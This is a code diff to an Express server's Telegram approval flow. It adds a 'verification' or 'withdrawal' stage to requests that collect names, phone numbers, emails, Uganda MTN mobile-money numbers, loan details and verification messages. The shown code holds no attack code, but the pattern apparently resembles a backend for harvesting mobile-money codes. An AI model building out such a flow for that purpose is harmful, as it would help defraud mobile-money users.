@@ -108,15 +108,17 @@ app.get('/api/telegram/approval/:approvalId', (req, res) => {
   const approval = approvalRequests.get(req.params.approvalId);
   if (!approval) return res.status(404).json({ error: 'Approval request not found.' });
 
-  return res.json({ action: approval.action });
+  return res.json({ action: approval.action, stage: approval.stage });
 });
 
 app.post('/api/telegram/contact', async (req, res) => {
   const { fullName, phone, email, mtnNumber, postalNumber, loanType, amount, verificationMessage } = req.body;
   const approvalId = verificationMessage ? randomUUID() : (req.body.approvalId || randomUUID());
-  if (!approvalRequests.has(approvalId)) {
-    approvalRequests.set(approvalId, { action: null, createdAt: Date.now() });
-  }
+  approvalRequests.set(approvalId, {
+    action: null,
+    createdAt: Date.now(),
+    stage: verificationMessage ? 'verification' : 'withdrawal'
+  });
 
   if (!validateUgandaMtnNumber(mtnNumber)) {
     return res.status(400).json({ error: 'A valid Uganda MTN number starting with 076, 077, 078, or 079 is required.' });
